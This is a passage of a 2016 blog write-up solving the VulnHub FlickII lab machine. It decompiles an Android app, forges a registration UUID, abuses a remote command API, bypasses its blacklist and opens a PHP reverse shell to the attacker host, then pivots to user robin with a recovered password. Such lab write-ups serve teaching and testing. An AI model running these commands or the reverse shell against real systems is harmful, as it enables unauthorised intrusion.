
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="Still playing with the vulnhub machines this time it is the turn of FlickII. This one is different from the others as it has an android application associated. It would be a great exercice to play with mobile application, decompile it and see what is in the inside." name="description"/>
<meta content="security, vulnhub, challenge, boot2root, linux" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Vulnhub - FlickII" property="og:title"/>
<meta content="Still playing with the vulnhub machines this time it is the turn of FlickII. This one is different from the others as it has an android application associated. It would be a great exercice to play with mobile application, decompile it and see what is in the inside." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2016/03/vulnhub-flickii.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2016-03-13 20:43:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="challenge" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Vulnhub - FlickII</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="vulnhub-flickii">Vulnhub - FlickII</h1>
<p>
      Posted on 13 Mar 2016 in <a href="../../category/security.html">security</a>

        • 13 min read
    </p>
</header>
<div>
<p><img alt="FlickII" class="align-left" src="/media/2016.03/flickii.png" width="162"/></p>
<p>Still playing with the vulnhub machines this time it is the turn of FlickII.
This one is different from the others as it has an android application
associated. It would be a great exercice to play with mobile application,
decompile it and see what is in the inside.</p>
<p>[TOC]</p>
<h2>Host discovery</h2>
<p>Connecting to host-only network:</p>
<div class="highlight"><pre><span></span><code>sudo ip addr add 192.168.56.1/24 dev vboxnet
</code></pre></div>
<p>Scanning the network to find the virtual machine IP address:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">maggick@rootine flick-check-dist</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sn</span><span class="w"> </span><span class="mf">192.168.56.1</span><span class="o">/</span><span class="mi">24</span>

<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.01</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2015</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">41</span><span class="w"> </span><span class="n">CET</span>
<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.1</span>
<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00061</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span>
<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.101</span>
<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00097</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span>
<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">256</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">addresses</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="n">hosts</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">2.45</span><span class="w"> </span><span class="n">seconds</span>
</code></pre></div>
<p>Scanning the virtual machine to find open ports:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">maggick@rootine flick-check-dist</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p0</span><span class="o">-</span><span class="mi">65535</span><span class="w"> </span><span class="mf">192.168.56.101</span><span class="w"> </span><span class="o">-</span><span class="n">T4</span>

<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.01</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2015</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">30</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">50</span><span class="w"> </span><span class="n">CET</span>
<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">192.168.56.101</span>
<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00088</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span>
<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65534</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span>
<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w">  </span><span class="n">SERVICE</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="n">closed</span><span class="w"> </span><span class="n">http</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">   </span><span class="n">https</span>

<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">123.28</span><span class="w"> </span><span class="n">seconds</span>
</code></pre></div>
<h2>APK analysis</h2>
<p>We got an apk. If we unzip it we got lots of xml files and a dex file.</p>
<div class="highlight"><pre><span></span><code><span class="n">ls</span><span class="w"> </span><span class="o">~/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">flickII</span><span class="o">/</span><span class="n">flick</span><span class="o">-</span><span class="n">check</span><span class="o">-</span><span class="n">dist</span>
<span class="n">AndroidManifest</span><span class="o">.</span><span class="n">xml</span><span class="w">  </span><span class="n">classes</span><span class="o">.</span><span class="n">dex</span><span class="w">  </span><span class="n">META</span><span class="o">-</span><span class="bp">INF</span><span class="w">  </span><span class="n">README</span><span class="w">  </span><span class="n">res</span><span class="w">  </span><span class="n">resources</span><span class="o">.</span><span class="n">arsc</span>
</code></pre></div>
<p>There is a lot of tool in order to decompile and APK and get class files or jar
files like dare (link is dead),
<a href="http://sourceforge.net/projects/dex2jar/">dex2jar</a> and more.</p>
<p>I tried to use dare to convert dex file to Java bytecode but there was an issue
between my 64 bits Arch Linux system and the 32 bits executable. I didn't dig
this issue and just go for dex2jar:</p>
<div class="highlight"><pre><span></span><code>sh d2j-dex2jar.sh flick-check-dist.apk
</code></pre></div>
<p>From there I use <a href="http://www.benf.org/other/cfr/">cfr</a> to decompile the jar file
to Java files and human readable code.</p>
<div class="highlight"><pre><span></span><code>java -jar cfr_0_110.jar flickII/flick-check-dist-dex2jar.jar --outputdir flickII/flick-check-dist-cfr-java/
</code></pre></div>
<p>We got the decompiled code. The interesting part of the application is the
com/flick/flickeck folder:</p>
<div class="highlight"><pre><span></span><code>├── com
│   ├── flick
│   │   └── flickcheck
│   │       ├── BuildConfig.java
│   │       ├── CallApi.java
│   │       ├── CommandActivity.java
│   │       ├── DoRegisterActivity.java
│   │       ├── MainActivity.java
│   │       ├── PubKeyManager.java
│   │       ├── ReadApiServerActivity.java
│   │       ├── RegisterActivity.java
│   │       └── R.java
</code></pre></div>
<p>We take a look at each file in this directory in order to understand the
application goal and how it works.</p>
<h3>API token and DoRegisterActivity.java</h3>
<p>The file DoRegisterActivity.java show us how to register a new device. By
testing the URL presented in the file we got:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure
{"error":"This method is not allowed for the requested resource."}
</code></pre></div>
<p>We lack an ID to "authenticate" ourself. The line 70 to 75 show us how to get
this ID:</p>
<div class="highlight"><pre><span></span><code><span class="n">Object</span><span class="w"> </span><span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TelephonyManager</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getBaseContext</span><span class="p">().</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">);</span>
<span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">object2</span><span class="p">.</span><span class="na">getDeviceId</span><span class="p">();</span>
<span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">object2</span><span class="p">.</span><span class="na">getSimSerialNumber</span><span class="p">();</span>
<span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UUID</span><span class="p">((</span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Settings</span><span class="p">.</span><span class="na">Secure</span><span class="p">.</span><span class="na">getString</span><span class="p">((</span><span class="n">ContentResolver</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getContentResolver</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="s">"android_id"</span><span class="p">)).</span><span class="na">hashCode</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span>
<span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">getSharedPreferences</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">2131099666</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">).</span><span class="na">getString</span><span class="p">(</span><span class="s">"api_server"</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span>
<span class="k">new</span><span class="w"> </span><span class="n">CallAPI</span><span class="p">().</span><span class="na">execute</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">"https://"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">"/register/new"</span><span class="p">,</span><span class="w"> </span><span class="n">object</span><span class="p">});</span>
</code></pre></div>
<p>Let us wrote some Java to generate this ID for us:</p>
<p>Our <code>object</code> and <code>object2</code> variables are named generically by the debugger. We
can see in the code above that <code>object</code> is a string containing the device ID and
that <code>object2</code> is a string containing the serial number of the Sim card.
Moreover the line where the code generate the new UUID (see the
<a href="http://docs.oracle.com/javase/1.5.0/docs/api/java/util/UUID.html">javadoc</a> for
more information about this object) use an other variable accessible on the
phone: the android ID.</p>
<p>With all this information we come easily with the following code:</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.UUID</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HelloWorld</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">deviceId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"12345"</span><span class="p">;</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">SimSerialNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"67890"</span><span class="p">;</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">androidId</span><span class="o">=</span><span class="w"> </span><span class="s">"34567"</span><span class="p">;</span>

<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">code</span><span class="o">=</span><span class="s">""</span><span class="p">;</span>

<span class="w">    </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UUID</span><span class="p">(</span><span class="n">androidId</span><span class="p">.</span><span class="na">hashCode</span><span class="p">(),</span><span class="w"> </span><span class="n">deviceId</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SimSerialNumber</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>We compile this code with <code>javac</code> and execute it with <code>java</code> (yeah I have named
it HelloWorld):</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine ~]$ java HelloWorld
00000000-02e7-1fb5-0000-000003daceff
</code></pre></div>
<p>We can now try again the URL with this UUID sent in a post parameter:</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine ~]$ curl --data 'uuid=00000000-02e7-1fb5-0000-000003daceff' https://192.168.56.101/register/new --insecure
{"registered":"ok","message":"The requested UUID is now registered.","token":"t6nsb2SrfYKqsp8JIdbEscwfwA6JEeUh"}
</code></pre></div>
<p>Great we are registered, what's next?</p>
<h3>Command execution and CommandActivity.java</h3>
<p>Line 111 in the file <code>CommandActivity.java</code> we see the doCmd method that seems
to execute commands on the server via HTTP:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doCmd</span><span class="p">(</span><span class="n">View</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">((</span><span class="n">Context</span><span class="p">)</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CharSequence</span><span class="p">)(</span><span class="s">"Running command: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="na">getTag</span><span class="p">().</span><span class="na">toString</span><span class="p">()),</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="mi">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span>
<span class="w">    </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeToString</span><span class="p">((</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="n">object</span><span class="p">.</span><span class="na">getTag</span><span class="p">().</span><span class="na">toString</span><span class="p">().</span><span class="na">getBytes</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TelephonyManager</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getBaseContext</span><span class="p">().</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">);</span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">string2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">object2</span><span class="p">.</span><span class="na">getDeviceId</span><span class="p">();</span>
<span class="w">    </span><span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">object2</span><span class="p">.</span><span class="na">getSimSerialNumber</span><span class="p">();</span>
<span class="w">    </span><span class="n">string2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UUID</span><span class="p">((</span><span class="s">""</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Settings</span><span class="p">.</span><span class="na">Secure</span><span class="p">.</span><span class="na">getString</span><span class="p">((</span><span class="n">ContentResolver</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">getContentResolver</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="s">"android_id"</span><span class="p">)).</span><span class="na">hashCode</span><span class="p">(),</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">string2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">object2</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()).</span><span class="na">toString</span><span class="p">();</span>
<span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">object3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">getSharedPreferences</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">2131099666</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">object2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object3</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">"api_server"</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span>
<span class="w">    </span><span class="n">object3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object3</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">"api_auth_token"</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span>
<span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">CallAPI</span><span class="p">().</span><span class="na">execute</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">"https://"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">"/do/cmd/"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">string2</span><span class="p">,</span><span class="w"> </span><span class="n">object3</span><span class="p">});</span>
<span class="p">}</span>
</code></pre></div>
<p>The View object in parameter is the command to execute. The command is just
base64 encoded before sending it to the server as <code>object</code> in the url, the
string2<code>parameter is the UUID we generate a few lines ago sent in the HTTP
header as 'X-UUID'
parameter, the</code>object3` parameter is the token to authenticate to the API given
with the curl command just before also sent in the header as 'X-Token' (you may
need to look at the CallAPI method and more particulary at line 182 and 183)</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine ~]$ curl   https://192.168.56.101/do/cmd/$(echo -ne id | base64) --header "X-UUID: 00000000-02e7-1fb5-0000-000003daceff" --header "X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18" --insecure
{"status":"ok","command":"id","output":"uid=998(nginx) gid=997(nginx) groups=997(nginx)\n"}
</code></pre></div>
<p>We can execute command on the server, let us wrote a simple bash script to
simplify the next steps (we put an echo at the end to have a nice output):</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>

curl<span class="w">   </span>https://192.168.56.101/do/cmd/<span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="k">)</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">"X-UUID: 00000000-02e7-1fb5-0000-000003daceff"</span><span class="w"> </span>--header<span class="w"> </span><span class="s2">"X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18"</span><span class="w"> </span>--insecure
<span class="nb">echo</span><span class="w"> </span><span class="s1">''</span>
</code></pre></div>
<p>Let us gather some information about the system (there is a blacklist that block
us and forgive us to directly use <code>ls</code> but the absolute path works):</p>
<div class="highlight"><pre><span></span><code>[maggick@rootine ~]$ ./p ls
{"status":"error","output":"Command 'ls' contains a banned command."}
[maggick@rootine ~]$ ./p /bin/ls
{"status":"ok","command":"\/bin\/ls","output":"index.php\ntest.php\n"}
</code></pre></div>
<h2>Shell exploitation</h2>
<h3>Reverse shell</h3>
<p>From there we can get an interactive reverse shell. Let us use the php reverse
shell from
<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:</p>
<p>We need to listen on our host machine for the server connection:</p>
<div class="highlight"><pre><span></span><code>nc -v -n -l -p 8080
</code></pre></div>
<p>Then we need to open the connection from the server:</p>
<div class="highlight"><pre><span></span><code>/bin\/php -r '$sock=fsockopen(\"192.168.56.1\",8080);exec(\"\/bin\/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4\");'
</code></pre></div>
<p>It works with no more restriction:</p>
<div class="highlight"><pre><span></span><code>sh-4.2$ id
id
uid=998(nginx) gid=997(nginx) groups=997(nginx)
</code></pre></div>
<h3>Batman and Robin?</h3>
<p>We can get a look at the <code>/etc/passwd</code> file:</p>
<div class="highlight"><pre><span></span><code>cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
nginx:x:998:997:Nginx web server:/var/lib/nginx:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
robin:x:1000:1000::/home/robin:/bin/bash
bryan:x:1001:1001::/home/bryan:/bin/bash
sean:x:1002:1002::/home/sean:/bin/bash
</code></pre></div>
<p>We can see in the <code>/etc/passwd</code> file that there is 3 users: robin, bryan and
sean. Moreover in the <code>CommandActivity.java</code> file we have seen that there is a
mean to execute ssh command (also the port is not open) using the user robin.
The password used for this command is a simply a XOR between the
<code>integryity_check</code> base64 encoded string at the beginning of the file and the
string define in the validate method. We can reuse the code from there and find
back the password: 40373df4b7a1f413af61cf7fd06d03a565a51898</p>
<p>With our reverse shell a simple <code>su robin</code> and the password above give us a shell
as the robin user:</p>
<div class="highlight"><pre><span></span><code>id
uid=1000(robin) gid=1000(robin) groups=1000(robin)
</code></pre></div>
<h3>Where is bryan?</h3>
<p>For the next part of the challenge we may need a real pty shell, Once more
<a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentest monkey</a>
will help us:</p>
<div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div>
<p>We go in the user directory (<code>cd</code>) and we see a file <code>debug.gpg</code>:</p>
<div class="highlight"><pre><span></span><code>cat debug.gpg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dude,

I know you are trying to debug this stupid dice thing, so I figured the below
will be useful?

[...]
__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &lt;unfinished ...&gt;
getenv("LD_PRELOAD")                                                                                          = nil
rand()                                                                                                        = 1804289383
__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
+++ exited (status 0) +++Dice said: 1804289383
[...]

Lemme know!

- --
Sean
</code></pre></div>
<p>We search for the dice program:</p>
<div class="highlight"><pre><span></span><code>find / -name 'dice' 2&gt;/dev/null
/usr/local/bin/dice
</code></pre></div>
<p>This program simply roll a dice:</p>
<div class="highlight"><pre><span></span><code>/usr/local/bin/dice
Dice said: 1804289383
</code></pre></div>
<p>An other useful information is that we can roll the dice as bryan:</p>
<div class="highlight"><pre><span></span><code>sudo -l
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

Matching Defaults entries for robin on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
